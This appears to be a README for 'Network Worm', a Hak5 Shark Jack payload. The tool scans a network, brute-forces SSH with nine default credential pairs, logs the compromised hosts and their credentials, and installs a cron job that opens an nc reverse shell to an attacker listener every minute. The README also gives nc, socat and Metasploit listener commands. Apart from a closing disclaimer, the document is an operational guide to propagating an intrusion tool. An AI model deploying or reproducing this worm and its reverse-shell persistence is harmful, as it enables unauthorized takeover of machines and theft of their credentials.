# Network Worm v1.0

**Autonomous SSH Network Propagation Tool for Hak5 Shark Jack Display**

A sophisticated network scanning and SSH brute-force payload that identifies live hosts, compromises them with weak credentials, and deploys persistent reverse shells via cron jobs.

## Features

- **Network Discovery**: Fast nmap-based host scanning across network segments
- **SSH Brute Force**: Automated credential testing with 9 common username/password combinations
- **OS Detection**: Identifies Linux vs Windows targets and deploys appropriate payloads
- **Persistent Reverse Shell**: Cron-based reverse shell on Linux targets (automatic callback every minute)
- **Credential Logging**: Complete log of all compromised hosts with timestamps
- **Interactive Menu System**: User-friendly menu for configuration and monitoring
- **Comprehensive Logging**: Detailed session logs and error tracking

## Prerequisites

### Shark Jack Display
- Hak5 Shark Jack Display device
- Network connectivity to target network
- **sshpass** installed (required)
  ```bash
  opkg update
  opkg install sshpass
  ```

### Target Network
- Linux/Unix targets with SSH enabled
- Weak or default credentials (root:root, admin:admin, test:test, etc.)
- Network access from Shark Jack to target devices

### Listener Server (Attacker)
- Netcat or socat for reverse shell handling
- Open port for incoming connections (default: 4444)

## Installation

1. Copy `payload.sh` to Shark Jack:
   ```bash
   scp payload.sh root@172.16.24.1:/root/library/my_payloads/Network_Worm/payload.txt
   ```

2. Ensure sshpass is installed on Shark Jack:
   ```bash
   ssh root@172.16.24.1
   opkg update
   opkg install sshpass
   ```

## Usage

### Basic Workflow

1. **Start the payload** on Shark Jack Display
2. **Configure Listener Host** - Enter your C2 server IP and port
3. **Start Worm Propagation** - Payload will:
   - Scan the network for live hosts
   - Attempt SSH brute force on each host
   - Detect target OS (Linux/Windows)
   - Deploy persistent reverse shell to Linux targets
   - Log all compromised credentials

### Menu Options

- **Configure Listener Host**: Set C2 callback IP and port
- **Start Worm Propagation**: Execute the attack
- **View Compromised Hosts**: Display list of compromised systems with credentials
- **View Worm Log**: Detailed session logs
- **Stop Worm**: Cleanup and stop running processes
- **Quit**: Exit payload

## Listener Setup

### Single Session (Simple)
```bash
nc -lvnp 4444
```

### Multiple Sessions with socat
```bash
socat TCP-LISTEN:4444,reuseaddr EXEC:/bin/bash
```

### Multiple Sessions with Metasploit
```bash
msfconsole
> use exploit/multi/handler
> set PAYLOAD linux/x86/shell_reverse_tcp
> set LHOST 10.0.0.222
> set LPORT 4444
> exploit -j
```

## How It Works

### Scanning Phase
1. Detects Shark Jack's IP and network range
2. Determines if single-device or full-network mode
3. Performs nmap ping scan to find live hosts
4. Filters out Shark Jack's own IP

### Exploitation Phase
For each discovered host:
1. Tests 9 common SSH credentials
2. On successful login:
   - Detects OS type (Linux/Windows)
   - Extracts hostname/IP for logging
   - For Linux: Deploys cron-based reverse shell
   - For Windows: Logs credentials only

### Persistence
Linux targets get a cron job:
```bash
* * * * * nc 10.0.0.222 4444 -e /bin/sh 2>/dev/null &
```
This executes every minute and connects back to your listener with shell access.

## Default Credentials Tested

The payload attempts these credential combinations:
- root:root
- root:password
- root:12345
- admin:admin
- admin:password
- admin:12345
- test:test
- oracle:oracle
- postgres:postgres

## Logging

All activities logged to `/root/loot/network_worm/`:

- **compromised_hosts.log**: List of successfully compromised hosts with credentials
- **worm_session_TIMESTAMP.txt**: Detailed session log with all scan results

## Payload Configuration

Edit these values in the script to customize:

```bash
LISTENER_HOST="010.000.000.222"  # Your C2 server (padded IP format)
LISTENER_PORT="4444"              # Your listener port
LOOT_BASE="/root/loot/network_worm"  # Local loot storage
```

## Important Notes

### IP Address Format
Listener IP uses padded format (e.g., `010.000.000.222`) for menu consistency. The payload automatically strips leading zeros before deployment, converting to standard format (e.g., `10.0.0.222`).

### Reverse Shell Callback
- Linux targets callback every minute via cron
- Ensure your listener is running BEFORE or immediately WHEN worms execute
- Multiple compromised hosts can connect to same listener on same port

### Cleanup
To remove deployed cron jobs from compromised machines:
```bash
ssh root@<target_ip>
crontab -r
```

## Troubleshooting

### Scan finds 0 hosts
- Verify network connectivity from Shark Jack
- Check network range (default: /24 from Shark Jack's subnet)
- Verify hosts are actually live and reachable

### No reverse shells connecting
- Verify listener is running on configured IP/port
- Check firewall allows inbound on listener port
- Verify IP address format (should be converted from padded to standard)
- Check compromised host can reach listener IP

## Security Considerations

- **Loud**: This payload generates significant network traffic and logs
- **Credentials**: Default credentials may be changed in real environments
- **Detection**: Brute force attempts and cron jobs are easily detectable
- **Persistence**: Cron jobs remain until manually removed

## Disclaimer

This payload is for authorized security testing only. Unauthorized access to computer systems is illegal. Always obtain written permission before testing.

## Author

Hackazillarex

## License

Use only on authorized networks with explicit permission.

